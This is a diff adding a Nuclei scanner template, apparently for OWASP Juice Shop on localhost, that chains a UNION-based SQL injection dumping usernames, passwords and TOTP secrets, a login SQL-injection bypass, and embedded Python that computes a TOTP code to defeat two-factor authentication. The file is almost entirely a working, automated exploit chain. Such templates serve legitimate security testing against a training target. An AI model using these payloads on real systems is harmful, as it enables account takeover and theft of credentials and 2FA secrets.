@@ -1,0 +1,117 @@
+id: two_factor_authenticate_flow
+
+info:
+  name: Juice Shop Two-Factor Authentication (Flow)
+  author: pdteam
+  severity: high
+  description: "Exploits SQLi to extract TOTP secret and bypass 2FA"
+  reference:
+    - https://owasp.org/www-project-juice-shop/
+  tags: juice-shop,sqli,2fa-bypass
+  
+  
+variables:
+  #secret_key: ""  # Will be populated from extractor
+  # tmp_token: {{tmp_token}}   # Will be populated from extractor
+  #otp: ""         # Will be populated from code execution
+
+flow: |
+  http(1) && http(2) && code() && http(3)
+
+requests:
+  - raw:
+      - >
+        GET
+        /rest/products/search?q=test'))%20UNION%20SELECT%20username,%20password,%20role,%20deletedAt,%20isActive,%20totpSecret%20AS%20TOTP,%20id,%20email,%20profileImage%20FROM%20USERS--
+        HTTP/1.1
+
+        Host: 127.0.0.1:3000
+    matchers:
+      - type: word
+        part: body
+        words:
+          - wurstbrot
+    extractors:
+      - type: regex
+        name: secret_key
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '"id":"wurstbrot"[^}]+"image":"([^"]+)"'
+
+      - type: regex
+        name: user_account
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '"id":"wurstbrot"[^}]+"updatedAt":"([^"]+)"'
+  - raw:
+      - |
+        POST /rest/user/login HTTP/1.1
+        Host: 127.0.0.1:3000
+        Content-Type: application/json
+        User-Agent: nuclei
+        Accept: */*
+        Content-Length: 50
+
+        {"email":"{{user_account}}' --","password":"1"}
+    matchers:
+      - type: status
+        status:
+          - 401
+    extractors:
+      - type: regex
+        name: tmp_token
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '"tmpToken":"(.*?)"'
+  - raw:
+      - |
+        POST /rest/2fa/verify HTTP/1.1
+        Host: 127.0.0.1:3000
+        Content-Type: application/json
+        Content-Length: 71
+
+        {"tmpToken": "{{tmp_token}}", "totpToken": "{{code_response}}"}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "authentication"
+          
+
+
+code:
+  - engine: 
+      - python3
+    source: |
+      import hmac
+      import base64
+      import struct
+      import hashlib
+      import time
+      import os
+      import json
+
+      def generate_otp(secret):
+          try:
+              key = base64.b32decode(secret, True)
+              msg = struct.pack(">Q", int(time.time())//30)
+              h = hmac.new(key, msg, hashlib.sha1).digest()
+              o = h[19] & 15
+              h = (struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff) % 1000000
+              return str(h).zfill(6)
+          except:
+              return "123456"  # Fallback OTP
+
+      # Get secret_key from environment (passed by Nuclei)
+      secret_key = os.getenv('secret_key', '')
+      otp = generate_otp(secret_key)
+      
+      # Output must be in JSON format for Nuclei to parse
+      print(otp)
+# digest: 4b0a00483046022100fbaad6ddb3bc2710e2ae9a3938d2c394fb56b2c3854e851d7f8d8641ccef1041022100da2106f11d4f58c969534e2f77d74c6da44496ac54f8b70371954da1aead1f5f:0dd34f63ed422f65711fe796f66903bf
